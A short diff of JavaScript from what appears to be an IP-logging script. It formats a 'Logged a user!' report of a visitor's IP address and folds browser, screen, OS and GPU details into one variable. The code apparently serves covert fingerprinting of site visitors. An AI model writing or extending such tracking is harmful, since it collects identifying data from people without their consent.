@@ -50,25 +50,7 @@ get_ip().then((ip) => {
 							title: 'Logged a user!',
 							description: `**IP Address:**
 ${ip}
----
-**Browser data:**
-
-Useragent: 
-${useragent}
-
-Refferer: ${refferer}
-Browser language: ${lang}
----
-**Screen details:**
-Size: ${width} x ${height}
----
-**Specs:**
-Operating system: ${os} 
-
-*GPU:*
-Core count: ${gpu}
----
----`,
+${info}`,
 						},
 					],
 				};
